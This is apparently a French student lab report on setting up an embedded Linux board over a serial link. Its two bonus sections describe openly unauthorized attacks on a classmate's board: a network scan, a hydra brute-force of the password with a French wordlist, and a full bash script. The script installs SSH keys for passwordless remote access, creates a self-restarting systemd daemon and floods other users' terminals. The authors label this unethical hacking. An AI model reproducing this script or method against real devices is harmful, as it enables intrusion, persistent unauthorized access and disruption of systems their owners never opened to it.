# TP_Linux

## 1. Prise en main
### 1.1 Préparation de la carte SD

### 1.2 Connection par liaison série
La première connection avec la carte se fait par liaison série. À l'aide de PuTTy, une liaison est établie entre un ordinateur et le port uart (usb mini) de la carte.

Au lancement de la liaison il est necessaire de se connecter avec l'identifiant et le mot de passe renseignés lors de la configuration de la carte SD. Dans notre cas:
identifiant: root
mot de passe:

Grâce à la commande `df -h`, il est possible de connaitre la taille occupée dans la carte SD. Executer cette commande permet de voir que le système de fichier n'occupe pas l'ensemble de l'espace de la carte SD. Pour remédier à cela, nous exécutons la commande `./expan_rootfs.sh`, puis nous lançons un reboot de la cate avec la commande `./resize2fs_once`.
## 2. Module Kernel



## Bonus 1 : Hacking non-ethique 👀

Les cartes sont toutes connectées en réseau et on un mot de passe par défaut. Il est donc possible de se connecter à une carte à distance. Pour cela, il faut connaitre l'adresse IP de la carte.
On utilise un scanner d'ip pour scanner le réseau et trouver l'adresse IP des cartes connectées.

La cible est la carte d'un des groupe de la classe qui a protégé sa carte avec un mot de passe. On utilise donc un outil de bruteforce pour trouver le mot de passe de la carte. On utilise l'outil hydra avec une wordlist pour trouver le mot de passe.
La wordlist utilisée est la wordlist richelieu qui contient les mots de passe les plus utilisés en France.

On utilise une VM kali qui contient tous les outils nécessaires pour réaliser cette attaque.

![Alt text](img/image2.png)

Le mot de passe de la carte est trouvé en 4 minutes 😁.

## Bonus 2 : Scripting 👨‍💻

On a maintenant accès à la carte. On peut donc réaliser un script qui permet de récupérer les données de la carte et de les envoyer sur un serveur distant.

On va installer automatiquement le package sl sur la carte puis générer un daemon systemd qui va executer la commande sl toutes les 5 minutes. On va aussi installer une clé ssh sur la carte pour pouvoir se connecter à distance sans mot de passe.

Le script est le suivant:


```bash
#!/bin/bash

# Stop and disable the sl service if it's running
echo "Stopping and disabling the sl service if it's running"
systemctl stop sl.service
systemctl disable sl.service

# Install ssh key
echo "Running ssh-keygen"
ssh-keygen -t rsa -b 4096 -C "" -f /root/.ssh/id_rsa -N ""
echo "ssh key generated successfully"

# Display the public key
echo "Here is the public key:"
cat /root/.ssh/id_rsa.pub

# Copy ssh key
echo "Copying ssh key"
ssh-copy-id -i /root/.ssh/id_rsa.pub root@
echo "ssh key copied successfully"

# Install sl
echo "Installing sl"
apt update
apt install -y sl
echo "sl installed"

# Create command script
echo "#!/bin/bash
terminals=(\"/dev/pts/0\" \"/dev/pts/1\" \"/dev/pts/2\")
# Iterate through each terminal and send the 'sl' command
for term in \${terminals[@]}; do
  if [ -c \"\$term\" ]; then
    /usr/games/sl > \"\$term\"
    echo \"Sent 'sl' command to \$term\"
  else
    echo \"Terminal \$term not found or not accessible.\"
  fi
done

" > /usr/local/bin/command.sh


# Make command script executable
chmod +x /usr/local/bin/command.sh
echo "Command script created and made executable"

# Create daemon
echo "Creating daemon"
echo "[Unit]
Description=SL Daemon

[Service]
ExecStart=/bin/bash -c "/usr/local/bin/command.sh"
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/sl.service

echo "Daemon created"

# Enable daemon
echo "Enabling daemon"
systemctl enable sl.service
echo "Daemon enabled"

# Start daemon
echo "Starting daemon"
systemctl start sl.service
echo "Daemon started"

```

![Alt text](image.png)

![Alt text](img/image.png)